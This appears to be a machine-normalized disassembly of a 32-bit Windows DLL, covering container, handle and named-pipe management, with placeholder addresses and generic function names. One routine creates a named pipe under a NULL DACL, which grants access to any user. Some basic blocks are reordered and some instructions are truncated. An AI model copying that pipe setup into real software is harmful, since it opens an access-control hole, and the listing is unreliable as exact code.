push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x5
cmp [ edi + 0x58 ] 0x0
jbe r-xdata
mov esi [ edi + 0x38 ]
xor edx edx
mov ecx [ edi + 0x3c ]
xor ebx ebx
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp esi [ edi + 0x3c ]
cmova ecx edx
test ecx ecx
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ edi + 0x48 ]
call sub_1001c6b0
mov edx eax
mov eax [ edx ]
test eax eax
je r-xdata
mov eax [ edi + 0x38 ]
mov [ edi + 0x3c ] eax
mov [ ebp - 0x4 ] 0x4
lea esi [ edi + 0x5c ]
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x6
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edi ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
dec ecx
and ecx [ edx + 0x8 ]
mov eax [ eax + ecx * 4 ]
movq xmm0 [ eax ]
mov eax [ eax + 0x8 ]
movq [ ebp - 0x20 ] xmm0
mov ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0x4
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
lea esi [ edi + 0x48 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x8
mov ecx esi
call sub_1001c630
mov [ ebp - 0x4 ] 0x3
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
push [ esi ]
call [ CloseHandle@IAT ]
inc ebx
lea esi [ esi + 0x4 ]
cmp ebx edi
jne r-xdata
mov edi [ ebp - 0x14 ]
dec [ edi + 0x58 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x30 ] 0x8
jb r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ edi + 0x38 ] 0x0
mov [ edi + 0x3c ] 0x0
mov [ edi + 0x40 ] 0x0
inc [ edi + 0x54 ]
mov [ edi + 0x54 ] 0x0
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] 0x7
mov [ edi + 0x2c ] 0x0
mov [ edi + 0x1c ] ax
mov [ ebp - 0x4 ] al
cmp [ edi + 0x18 ] 0x8
jb r-xdata
push [ edi + 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ edi + 0x58 ] 0x0
ja r-xdata
mov [ edi + 0x18 ] 0x7
xor eax eax
mov [ edi + 0x14 ] 0x0
mov [ edi + 0x4 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ edi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10029650
push ebp
mov ebp esp
push 0xffffffff
push sub_10050dcb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x10 ] ebx
mov eax [ ebx + 0x5c ]
lea ecx [ ebx + 0x5c ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx ebx
call sub_10029950
test eax eax
jne r-xdata
push 0x44
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10028790
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
xor edx edx
xor edi edi
mov [ ecx ] eax
mov esi [ ebx + 0x38 ]
mov ecx [ ebx + 0x3c ]
sub ecx esi
add ecx 0x3
shr ecx 0x2
cmp esi [ ebx + 0x3c ]
cmova ecx edx
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x44 ]
mov eax [ ecx ]
call [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ eax + 0x20 ]
mov [ ebx + 0x44 ] eax
mov [ eax + 0x14 ] ebx
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
mov [ ebx + 0x3c ] eax
mov ebx ecx
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push [ esi ]
call [ CloseHandle@IAT ]
inc edi
lea esi [ esi + 0x4 ]
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
sub_100297b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050e11
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
sub esp 0x18
mov [ ebp - 0x10 ] 0x0
mov ecx esp
mov [ ebp - 0x14 ] esp
xor edx edx
add eax 0x1c
push 0xffffffff
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] dx
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_10029840
push ebp
mov ebp esp
push 0xffffffff
push sub_10050e48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
sub esp 0x18
mov ecx esp
mov [ ebp - 0x30 ] esp
lea eax [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_100292a0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x4 ]
cmp [ eax + 0x14 ] 0x8
mov edx [ eax + 0x10 ]
jb r-xdata
push edx
push eax
push [ ecx + 0x10 ]
push ecx
call sub_10009890
test eax eax
sete al
mov [ ebp - 0x29 ] al
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x14 ] 0x8
jb r-xdata
mov eax [ eax ]
xor ecx ecx
mov [ ebp - 0x14 ] 0x7
xor ebx ebx
mov [ ebp - 0x18 ] 0x0
test al al
mov [ ebp - 0x28 ] cx
setne bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
mov al [ ebp - 0x29 ]
add esp 0x4
mov [ ebp + 0x1c ] 0xf
mov eax ebx
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10029950
push ebp
mov ebp esp
push 0xffffffff
push sub_10050e81
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x18 ] ebx
mov eax [ ebx + 0x3c ]
lea esi [ ebx + 0x38 ]
sub eax [ esi ]
sar eax 0x2
cmp eax 0x5
jae r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebp - 0x3c ]
push 0x1
push eax
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x1
lea eax [ ebp - 0x3c ]
push eax
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
jne r-xdata
xor edi edi
jmp r-xdata
cmp [ ebx + 0x30 ] 0x8
lea ecx [ ebx + 0x1c ]
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x24 ] eax
jb r-xdata
xor edi edi
jmp r-xdata
mov [ ebp - 0x10 ] edi
mov [ ebx + 0x34 ] 0x0
cmp edi 0xffffffff
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx 0x80000
push eax
push 0x0
push 0x1000
xor eax eax
cmp edi 0x1
push 0x1000
push 0xff
cmove eax edx
push 0x1
or eax 0x3
push eax
push ecx
call [ CreateNamedPipeW@IAT ]
mov edi eax
mov ecx [ ecx ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x4 ]
lea eax [ ebp - 0x10 ]
cmp eax ecx
jae r-xdata
mov edx [ esi + 0x8 ]
cmp ecx edx
jne r-xdata
mov ebx [ esi ]
cmp ebx eax
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
cmp eax 0x1
jae r-xdata
mov edx [ esi + 0x8 ]
mov edi eax
sub edi ebx
sar edi 0x2
cmp ecx edx
jne r-xdata
add [ esi + 0x4 ] 0x4
mov eax [ esi + 0x4 ]
sub eax [ esi ]
sar eax 0x2
cmp eax 0x5
jae r-xdata
mov [ eax ] edi
mov ebx [ esi ]
mov eax 0x3fffffff
sub ecx ebx
sar ecx 0x2
sub eax ecx
cmp eax 0x1
jb r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov eax edx
sub eax ecx
sar eax 0x2
cmp eax 0x1
jae r-xdata
mov ebx [ ebp - 0x18 ]
jmp r-xdata
push r--data
call sub_1003c5be
inc ecx
sub edx ebx
sar edx 0x2
mov eax 0x3fffffff
mov [ ebp - 0x14 ] ecx
mov ecx edx
shr ecx 0x1
sub eax ecx
cmp eax edx
jae r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ eax + edi * 4 ]
mov [ ecx ] eax
sub ecx ebx
mov eax 0x3fffffff
sar ecx 0x2
sub eax ecx
cmp eax 0x1
jb r-xdata
add edx ecx
xor edx edx
jmp r-xdata
inc ecx
sub edx ebx
sar edx 0x2
mov eax 0x3fffffff
mov [ ebp - 0x14 ] ecx
mov ecx edx
shr ecx 0x1
sub eax ecx
cmp eax edx
jae r-xdata
cmp edx [ ebp - 0x14 ]
mov ecx esi
cmovb edx [ ebp - 0x14 ]
push edx
call sub_10003e80
add edx ecx
xor edx edx
jmp r-xdata
cmp edx [ ebp - 0x14 ]
mov ecx esi
cmovb edx [ ebp - 0x14 ]
push edx
call sub_10003e80
sub_10029b70
push ebp
mov ebp esp
push 0xffffffff
push sub_10050ea8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
lea esi [ edi + 0x5c ]
mov [ ebp - 0x10 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
lea ecx [ edi + 0x48 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_10029f00
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov eax [ esi ]
call [ eax + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_10029bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050ed8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
lea esi [ edi + 0x5c ]
mov [ ebp - 0x10 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
cmp [ edi + 0x58 ] 0x0
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ edi + 0x48 ]
call sub_1001c6b0
mov edx eax
mov eax [ edx ]
test eax eax
je r-xdata
xor edi edi
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
dec ecx
and ecx [ edx + 0x8 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ ebp + 0x10 ]
movq xmm0 [ eax ]
mov edx [ eax + 0x8 ]
movq [ ebp - 0x1c ] xmm0
mov eax [ ebp - 0x1c ]
mov [ ecx ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ eax ] edx
dec [ edi + 0x58 ]
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov edx [ esi ]
call [ edx + 0xc ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
inc [ edi + 0x54 ]
mov [ edi + 0x54 ] 0x0
jmp r-xdata
mov edi 0x1
sub_10029cf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050f08
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ecx + 0x44 ]
test edi edi
jne r-xdata
lea esi [ edi + 0x20 ]
mov [ ebp - 0x10 ] esi
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov edi [ edi + 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
mov edx [ esi ]
call [ edx + 0xc ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10029d90
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f068
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_1002a060
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10029df0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050f48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push eax
push [ eax ]
lea eax [ ebp - 0x14 ]
push eax
call sub_1002a140
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10029e60
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov ebx [ eax + 0x4 ]
mov esi ebx
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax [ edi ]
mov [ eax + 0x4 ] eax
mov eax [ edi ]
mov [ eax ] eax
mov eax [ edi ]
mov [ eax + 0x8 ] eax
mov [ edi + 0x4 ] 0x0
pop edi
pop esi
pop ebx
retn
push [ esi + 0x8 ]
mov ecx edi
call sub_1002a1e0
mov esi [ esi ]
push ebx
call j_sub_1003f3e3#2
add esp 0x4
mov ebx esi
cmp [ esi + 0xd ] 0x0
je r-xdata
sub_10029eb0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050f80
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
push [ ecx ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_10029f00
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
inc eax
cmp [ esi + 0x8 ] eax
ja r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ esi + 0x10 ]
dec ecx
and [ esi + 0xc ] ecx
add eax [ esi + 0xc ]
and eax ecx
push edi
lea edi [ eax * 4 ]
mov eax [ esi + 0x4 ]
cmp [ edi + eax ] 0x0
jne r-xdata
push ecx
call sub_1002a220
mov eax [ esi + 0x4 ]
mov ecx [ edi + eax ]
pop edi
test ecx ecx
je r-xdata
push 0xc
call sub_1003cdeb
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
inc [ esi + 0x10 ]
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
movq xmm0 [ eax ]
movq [ ecx ] xmm0
mov eax [ eax + 0x8 ]
mov [ ecx + 0x8 ] eax
call sub_1003c58d
mov eax [ esi + 0x4 ]
mov [ edi + eax ] ecx
sub_10029f80
push ebp
mov ebp esp
push 0xffffffff
push sub_10050fb9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi + 0x10 ]
inc eax
cmp [ edi + 0x8 ] eax
ja r-xdata
mov ecx [ edi + 0x8 ]
mov eax [ edi + 0x10 ]
dec ecx
and [ edi + 0xc ] ecx
add eax [ edi + 0xc ]
and ecx eax
mov eax [ edi + 0x4 ]
lea ebx [ ecx * 4 ]
cmp [ ebx + eax ] 0x0
jne r-xdata
push ecx
call sub_1002a3a0
mov eax [ edi + 0x4 ]
mov ebx [ ebx + eax ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
push 0x20
call sub_1003cdeb
mov ecx eax
add esp 0x4
test ecx ecx
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
inc [ edi + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov ecx ebx
push 0xffffffff
push 0x0
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
push esi
mov [ ebx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0x18 ]
mov [ ebx + 0x18 ] eax
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov [ ebx + eax ] ecx
call sub_1003c58d
sub_1002a060
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e7f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
lea ecx [ ecx ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea esp [ esp ]
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
dec [ esi + 0x10 ]
jne r-xdata
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
test edi edi
jne r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
dec edi
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
dec ecx
add eax ecx
mov ecx [ esi + 0x8 ]
dec ecx
and ecx eax
mov eax [ esi + 0x4 ]
mov edi [ eax + ecx * 4 ]
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ edi + 0x14 ] 0x10
jb r-xdata
sub_1002a140
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp eax [ esi ]
jne r-xdata
cmp eax edx
je r-xdata
cmp edx esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax ecx
mov esp ebp
pop ebp
retn 0xc
cmp [ eax + 0xd ] 0x0
mov ecx eax
jne r-xdata
call sub_10029e60
mov eax [ edi ]
pop edi
pop esi
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
push ecx
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
call sub_1002a520
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
mov edx [ eax + 0x8 ]
cmp [ edx + 0xd ] 0x0
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0xd ] 0x0
jne r-xdata
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edx
cmp eax [ edx + 0x8 ]
jne r-xdata
jmp r-xdata
mov eax edx
mov [ ebp + 0xc ] eax
mov edx [ edx + 0x4 ]
cmp [ edx + 0xd ] 0x0
je r-xdata
mov edx eax
mov eax [ edx ]
cmp [ eax + 0xd ] 0x0
je r-xdata
jmp r-xdata
sub_1002a1e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov esi edi
cmp [ edi + 0xd ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ esi + 0x8 ]
mov ecx ebx
call sub_1002a1e0
mov esi [ esi ]
push edi
call j_sub_1003f3e3#2
add esp 0x4
mov edi esi
cmp [ esi + 0xd ] 0x0
je r-xdata
sub_1002a220
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx ecx
push esi
mov esi 0x1
mov [ ebp - 0x14 ] ebx
push edi
mov edx [ ebx + 0x8 ]
test edx edx
cmovne esi edx
jmp r-xdata
mov eax esi
sub eax edx
cmp eax 0x1
jb r-xdata
mov eax 0x15555555
sub eax esi
cmp eax esi
jb r-xdata
cmp esi 0x8
jae r-xdata
push r--data
call sub_1003c5be
add esi esi
jmp r-xdata
mov edi [ ebx + 0xc ]
sub esi edx
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
lea eax [ edx + esi ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
shl eax 0x2
lea edx [ ecx + edi * 4 ]
sub eax edx
add eax ecx
mov ecx [ ebp - 0x8 ]
sar eax 0x2
lea edi [ eax * 4 ]
mov eax [ ebp - 0x4 ]
push edi
push edx
lea eax [ eax + ecx * 4 ]
push eax
call sub_1003c640
mov ecx [ ebx + 0x4 ]
add esp 0xc
lea edx [ edi + eax ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp edi esi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
lea edi [ esi * 4 ]
mov eax edi
and eax 0xfffffffc
push eax
push ecx
push edx
call sub_1003c640
mov eax [ ebx + 0x4 ]
lea ecx [ edi + eax ]
mov edi [ ebp - 0x8 ]
lea edx [ edi * 4 ]
sub edx ecx
add edx eax
sar edx 0x2
lea ebx [ edx * 4 ]
push ebx
push ecx
push [ ebp - 0x4 ]
call sub_1003c640
add esp 0x18
lea edi [ ebx + eax ]
mov ebx [ ebp - 0x4 ]
test esi esi
je r-xdata
lea eax [ edi * 4 ]
mov edx esi
sar eax 0x2
sub edx edi
mov [ ebp - 0x10 ] edx
lea ebx [ eax * 4 ]
push ebx
push ecx
push [ ebp - 0xc ]
call sub_1003c640
mov ecx [ ebp - 0x10 ]
add esp 0xc
lea edx [ ebx + eax ]
test ecx ecx
je r-xdata
call sub_1003c58d
shl eax 0x2
push eax
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x14 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
mov ebx [ ebp - 0x4 ]
test edi edi
je r-xdata
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp - 0x8 ]
add [ edi + 0x8 ] esi
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov ecx edi
mov edi ebx
jmp r-xdata
xor eax eax
[ edi ]
sub_1002a3a0
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx ecx
push esi
mov esi 0x1
mov [ ebp - 0x14 ] ebx
push edi
mov edx [ ebx + 0x8 ]
test edx edx
cmovne esi edx
jmp r-xdata
mov eax esi
sub eax edx
cmp eax 0x1
jb r-xdata
mov eax 0x7ffffff
sub eax esi
cmp eax esi
jb r-xdata
cmp esi 0x8
jae r-xdata
push r--data
call sub_1003c5be
add esi esi
jmp r-xdata
mov edi [ ebx + 0xc ]
sub esi edx
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
lea eax [ edx + esi ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
shl eax 0x2
lea edx [ ecx + edi * 4 ]
sub eax edx
add eax ecx
mov ecx [ ebp - 0x8 ]
sar eax 0x2
lea edi [ eax * 4 ]
mov eax [ ebp - 0x4 ]
push edi
push edx
lea eax [ eax + ecx * 4 ]
push eax
call sub_1003c640
mov ecx [ ebx + 0x4 ]
add esp 0xc
lea edx [ edi + eax ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp edi esi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
lea edi [ esi * 4 ]
mov eax edi
and eax 0xfffffffc
push eax
push ecx
push edx
call sub_1003c640
mov eax [ ebx + 0x4 ]
lea ecx [ edi + eax ]
mov edi [ ebp - 0x8 ]
lea edx [ edi * 4 ]
sub edx ecx
add edx eax
sar edx 0x2
lea ebx [ edx * 4 ]
push ebx
push ecx
push [ ebp - 0x4 ]
call sub_1003c640
add esp 0x18
lea edi [ ebx + eax ]
mov ebx [ ebp - 0x4 ]
test esi esi
je r-xdata
lea eax [ edi * 4 ]
mov edx esi
sar eax 0x2
sub edx edi
mov [ ebp - 0x10 ] edx
lea ebx [ eax * 4 ]
push ebx
push ecx
push [ ebp - 0xc ]
call sub_1003c640
mov ecx [ ebp - 0x10 ]
add esp 0xc
lea edx [ ebx + eax ]
test ecx ecx
je r-xdata
call sub_1003c58d
shl eax 0x2
push eax
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x14 ]
